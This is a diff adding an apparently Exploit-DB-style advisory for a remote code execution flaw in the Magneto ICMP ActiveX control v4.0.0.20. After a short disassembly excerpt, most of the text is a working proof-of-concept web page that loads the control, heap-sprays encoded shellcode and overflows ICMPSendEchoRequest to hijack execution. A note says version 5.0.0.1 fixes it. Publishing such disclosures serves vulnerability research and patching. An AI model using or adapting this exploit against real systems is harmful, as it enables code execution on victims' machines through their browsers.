@@ -1,0 +1,54 @@
+Magneto ICMP ActiveX v4.0.0.20 ICMPSendEchoRequest Remote Code Execute
+Date: 2011-5-27
+Discovered by: boahat
+vendor: 	http://www.magnetosoft.com/
+Download: http://www.magnetosoft.com/downloads/skicmp_setup.exe 
+
+SKIcmp.ocx
+
+Function ICMPSendEchoRequest (
+ 	ByVal bstrDestinationAddress  As String 
+)  As Long
+
+.text:1000F012                 mov     edx, [ebx+8]	// edx can be control
+.text:1000F015                 lea     ecx, [esp+468h+String1]
+.text:1000F019                 push    esi
+.text:1000F01A                 push    ecx
+.text:1000F01B                 call    edx		// bomb...
+
+[POC]
+
+<html>
+<body>
+<object classid="clsid:3A86F1F2-4921-4C75-AF2C-A1AA241E12BA" id="target"></object>
+<script>
+    var shellcode = unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");
+
+    var bigblock  = unescape("%u0c0c%u0c0c");
+    var headersize = 20;
+    var slackspace = headersize+shellcode.length;
+    while (bigblock.length<slackspace)
+        bigblock+=bigblock;
+      
+    fillblock = bigblock.substring(0, slackspace);
+    block = bigblock.substring(0, bigblock.length-slackspace);
+    while(block.length+slackspace<0x40000)
+        block = block+block+fillblock;
+  
+    memory = new Array();
+    for (x=0; x<500; x++)
+        memory[x] = block + shellcode;
+		
+    var buffer = '';	
+    while (buffer.length < 6000)
+        buffer+="\x0c\x0c\x0c\x0c";
+    target.ICMPSendEchoRequest(buffer);
+</script>
+</body>
+</html>
+
+
+# Exploit-DB Note:
+# According to MagnetSoft The exploit has been fixed in the latest version of the software,5.0.0.1.
+# The latest version that contains the fix can be downloaded here:
+# http://www.magnetosoft.com/www/downloads/win32/skdns_setup.exe
